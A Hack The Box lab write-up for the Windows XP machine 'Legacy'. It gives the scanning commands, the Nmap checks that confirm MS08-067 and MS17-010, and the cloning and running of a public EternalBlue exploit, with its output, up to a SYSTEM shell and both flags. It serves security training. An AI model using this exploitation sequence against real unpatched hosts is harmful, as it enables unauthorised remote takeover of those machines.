# HTB: Legacy

**Difficulty:** Easy  
**OS:** Windows XP  
**Target IP:** 10.129.71.216  
**Attacker IP:** 10.10.15.146  

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep using RustScan to quickly identify open ports on the target.
```bash
rustscan -a 10.129.71.216
```
**Results:**
```
Open 10.129.71.216:135
Open 10.129.71.216:139
Open 10.129.71.216:445
```
With only three ports open, I followed up with a detailed service scan using Nmap to gather more information on the services running.
```bash
nmap -p135,139,445 10.129.71.216 -sCV -T4 -oA nmap/nmap
```
**Results:**
```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: a2:de:ad:a6:84:2c (unknown)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2026-08-30T15:16:27+03:00
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5d12h38m12s, deviation: 2h07m16s, median: 5d11h08m12s
```

This reveals a Windows XP machine (likely a Domain Controller or a standalone server) with SMB and RPC services running. The `smb-os-discovery` script confirms it's an older Windows 2000/XP system, which is a strong indicator of legacy vulnerabilities.

## 2. Vulnerability Identification

### SMB Vulnerability Scanning

Given the outdated OS, I immediately scanned for well-known SMB vulnerabilities, specifically the infamous EternalBlue (MS17-010) and NetAPI (MS08-067). I used Nmap's built-in scripts to check for these.
```bash
nmap -Pn -p139,445 --script smb-vuln-ms08-067,smb-vuln-ms17-010 10.129.71.216
```
**Results:**
```
Host script results:
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

The target is vulnerable to both MS08-067 and MS17-010. For this write-up, I'll focus on exploiting MS17-010, which offers a more reliable shell on modern systems.

## 3. Exploitation — Foothold

### Gaining a SYSTEM Shell via MS17-010

I used a Python exploit for MS17-010 from GitHub (https://github.com/h3x0v3rl0rd/MS17-010). This exploit uses a named pipe to groom the kernel pool and achieve remote code execution.
```bash
git clone https://github.com/h3x0v3rl0rd/MS17-010.git
cd MS17-010
python3 exploit.py 10.129.71.216
```
**Output (truncated):**
```
[*] Target OS: Windows 5.1
[+] Found pipe 'browser'
[+] Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
...
[*] make this SMB session to be SYSTEM
[+] current TOKEN addr: 0xe22b7f10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe22b7fb0
[*] overwriting token UserAndGroups
[*] have fun with the system smb session!
[!] Dropping a semi-interactive shell (remember to escape special chars with ^) 
[!] Executing interactive programs will hang shell!

C:\WINDOWS\system32>
```

The exploit successfully bypasses the authentication and grants a shell running as `NT AUTHORITY\SYSTEM`.

**Verifying the System Shell:**
```cmd
C:\WINDOWS\system32>ver
Microsoft Windows XP [Version 5.1.2600]
C:\WINDOWS\system32>tasklist /v /fi "imagename eq cmd.exe"

Image Name                   PID Session Name     Session#    Mem Usage Status          User Name                                              CPU Time Window Title                                                            
========================= ====== ================ ======== ============ =============== ================================================== ============ ========================================================================
cmd.exe                     1680 Console                 0      2.472 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 N/A                                                                     
cmd.exe                     1652 Console                 0      2.492 K Running         NT AUTHORITY\SYSTEM                                     0:00:00 C:\WINDOWS\system32\cmd.exe /Q /c  C:\WINDOWS\TEMP\pYIE.bat             
```

This confirms the shell is running as `SYSTEM`, which is the highest privilege level on a Windows machine.

**Retrieving Flags:**
The flags are located in the `Desktop` directories of the respective users.
```cmd
C:\Documents and Settings\Administrator\Desktop>type root.txt
[ROOT FLAG CONTENT]
C:\Documents and Settings\john\Desktop>type user.txt
[USER FLAG CONTENT]
```

✅ Foothold obtained as `NT AUTHORITY\SYSTEM`. Both user and root flags are accessible.

## 4. Summary

| Stage | Technique |
|---|---|
| Recon | `rustscan` + `nmap` → Identified SMB (445) and RPC (135) services on a Windows XP machine |
| Vulnerability ID | `nmap` SMB scripts confirmed the target was vulnerable to both MS08-067 and MS17-010 (EternalBlue) |
| Exploitation | Used a public MS17-010 Python exploit to gain a semi-interactive reverse shell |
| Privilege Escalation | Not needed — the exploit itself grants a `SYSTEM`-level shell |

**Root cause / lessons learned:**

- The target is a highly outdated operating system, Windows XP, which lacks fundamental security features and patches.
- The SMBv1 protocol, by default, contains critical vulnerabilities like EternalBlue. Microsoft released a patch (MS17-010) in 2017, but this machine was never updated.
- End-of-life operating systems should never be exposed to a network, as they provide an easy foothold for attackers to compromise entire systems with publicly available exploits.

## 5. Tools Used

- `rustscan`, `nmap` — reconnaissance and vulnerability scanning
- `MS17-010` (GitHub: h3x0v3rl0rd/MS17-010) — EternalBlue exploit for Windows XP
- `tasklist`, `ver` — Shell verification and enumeration tools
